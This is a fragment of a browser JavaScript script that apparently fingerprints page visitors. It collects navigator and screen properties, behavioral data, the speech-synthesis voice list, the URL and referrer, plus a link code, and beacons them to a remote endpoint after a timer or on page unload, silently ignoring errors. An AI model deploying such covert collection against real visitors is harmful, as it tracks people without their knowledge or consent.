      if (navigator.sendBeacon) {
        navigator.sendBeacon(cfg.endpoint + COLLECT_URL, new Blob([body], { type: 'application/json' }));
      } else {
        await fetch(cfg.endpoint + COLLECT_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body, keepalive: true });
      }
    } catch {}
  }

  /* ═══════ INIT ═══════ */
  let _sent = false;
  async function init() {
    setupBehavioral();
    if (window.speechSynthesis) { speechSynthesis.onvoiceschanged = () => {}; speechSynthesis.getVoices(); }

    // Best-effort emergency send on unload
    window.addEventListener('beforeunload', () => {
      if (_sent) return;
      try {
        const cfg = getScriptCfg();
        const partial = {
          partial: true,
          link_code: cfg.link_code,
          navigator: collectNavigator(),
          screen: collectScreen(),
          behavioral: behav,
          meta: { url: location.href, referrer: document.referrer, durationMs: ts() },
        };
        if (navigator.sendBeacon) {
          navigator.sendBeacon(cfg.endpoint + COLLECT_URL, new Blob([JSON.stringify(partial)], { type: 'application/json' }));
        }
      } catch {}
    });

    setTimeout(async () => { const fp = await collect(); _sent = true; await send(fp); }, COLLECT_DURATION);
  }

  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", init);
  else init();
})();
